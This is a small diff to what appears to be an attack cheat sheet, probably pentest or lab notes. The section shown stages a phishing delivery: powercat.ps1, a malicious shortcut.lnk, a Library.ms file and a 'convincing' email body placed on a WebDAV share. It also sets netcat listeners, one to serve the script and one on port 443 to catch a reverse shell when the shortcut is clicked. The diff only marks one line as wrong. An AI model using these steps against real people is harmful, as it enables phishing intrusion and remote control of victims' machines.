@@ -43,7 +43,7 @@ https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 
 ### 4) Staging 
 - Place `powercat.ps1`, `shortcut.lnk`, `config.Library.ms` & `body.txt` in **/Webdav**
-- nc -lnvp 1337 (from **/WebDav** to get `powercat.ps1`)
+- nc -lnvp 1337 (from **/WebDav** to get `powercat.ps1`) <-- this is wrong
 - nc -lnvp 443 (to catch reverse shell when .lnk gets clicked)
 - `body.txt` has to sound convincing
 ```
